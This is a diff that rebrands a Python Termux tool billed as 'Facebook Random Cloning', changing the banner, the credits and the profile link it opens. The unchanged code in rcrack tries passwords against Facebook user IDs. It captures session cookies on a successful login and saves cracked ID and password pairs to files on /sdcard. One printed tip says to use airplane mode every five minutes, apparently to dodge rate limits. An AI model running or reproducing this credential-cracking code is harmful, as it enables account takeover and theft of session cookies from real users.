@@ -90,29 +90,19 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://www.facebook.com/profile.php?id=100051615728992')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100051985358436')
 logo = ("""
 
-\033[32;1m╔══════════════════════════════════════════════════════╗
-\033[32;1m║\033[37;1m███████╗\033[33;1m██╗  ██╗ \033[32;1m█████╗ \033[30;1m██╗    ██╗ \033[32;1m██████╗ \033[30;1m███╗   ██╗
-\033[32;1m║\033[37;1m██╔════╝\033[33;1m██║  ██║\033[32;1m██╔══██╗\033[30;1m██║    ██║\033[32;1m██╔═══██╗\033[30;1m████╗  ██║
-\033[32;1m║\033[37;1m███████╗\033[33;1m███████║\033[32;1m███████║\033[30;1m██║ █╗ ██║\033[32;1m██║   ██║\033[30;1m██╔██╗ ██║
-\033[32;1m║\033[37;1m╚════██║\033[33;1m██╔══██║\033[32;1m██╔══██║\033[30;1m██║███╗██║\033[32;1m██║   ██║\033[30;1m██║╚██╗██║
-\033[32;1m║\033[37;1m███████║\033[33;1m██║  ██║\033[32;1m██║  ██║\033[30;1m╚███╔███╔╝\033[32;1m╚██████╔╝\033[30;1m██║ ╚████║
-\033[32;1m║\033[37;1m╚══════╝\033[33;1m╚═╝  ╚═╝\033[32;1m╚═╝  ╚═╝ \033[30;1m╚══╝╚══╝  \033[32;1m╚═════╝ \033[30;1m╚═╝  ╚═══╝    
-\033[32;1m╚══════════════════════════════════════════════════════╝                              
-    
- \033[1;93m╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
- \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐌𝐃 𝐌𝐄𝐇𝐄𝐃𝐈 𝐇𝐀𝐒𝐒𝐀𝐍      \033[1;32m║
- \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐌𝐃 𝐒𝐇𝐀𝐖𝐎𝐍 𝐒𝐎𝐑𝐊𝐀𝐑      \033[1;32m║
- \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mPINIK-SHAWON         \033[1;32m ║
- \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning       \033[1;32m ║
- \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35 GAZIPUR SPAMMING TEAM \033[1;32m ║
- \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                  \033[1;32m ║
+
+ \033[1;93m╔═════════════════[\033[1;32m 𝗔𝗱𝗺𝗶𝗻 𝗜𝗻𝗳𝗼 \033[1;32m]══════════════╗
+ \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚      \033[1;32m║
+ \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚      \033[1;32m║
+ \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35m mdmuradhasanmedia        \033[1;32m ║
+ \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Facebook Random Cloning       \033[1;32m ║
+ \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m 1.1               \033[1;32m ║
  \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m║
- \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....                 \033[1;32m  ║
- \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m 𝐒𝐇𝐀𝐖𝐎𝐍 TERMUX COMMEND ZONE....          \033[1;32m ║
- \033[1;93m╚═════════════════[\033[1;93m 𝐏𝐈𝐍𝐈𝐊-𝐒𝐇𝐀𝐖𝐎𝐍 \033[1;32m]══════════════╝""")
+ \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME....                 \033[1;32m  ║
+ \033[1;93m╚═════════════════[\033[1;93m 𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚 \033[1;32m]══════════════╝""")
 def linex():
 	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
 loop = 0
@@ -120,7 +110,7 @@ oks = []
 cps = []
 def clear():
     os.system('clear')
-    os.system('xdg-open https://www.facebook.com/profile.php?id=100051615728992')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100051985358436')
     print(logo)
 from time import localtime as lt
 from os import system as cmd
@@ -235,7 +225,7 @@ def xxr():
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
         print(f'{x} \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
-        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m 𝐌𝐑-𝐒𝐇𝐀𝐖𝐎𝐍')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m 𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚')
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
@@ -289,22 +279,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[𝐌𝐑-𝐒𝐇𝐀𝐖𝐎𝐍-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-OK✅] ' +uid+ ' | ' +ps+    '  \n[‎‎🔥]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/𝐌𝐑-𝐒𝐇𝐀𝐖𝐎𝐍-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;31m [𝐌𝐑-𝐒𝐇𝐀𝐖𝐎𝐍-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/𝐌𝐑-𝐒𝐇𝐀𝐖𝐎𝐍-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('\r\r\33[1;31m [𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s {x}[{xr}𝐌𝐑-𝐒𝐇𝐀𝐖𝐎𝐍 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s {x}[{xr}𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
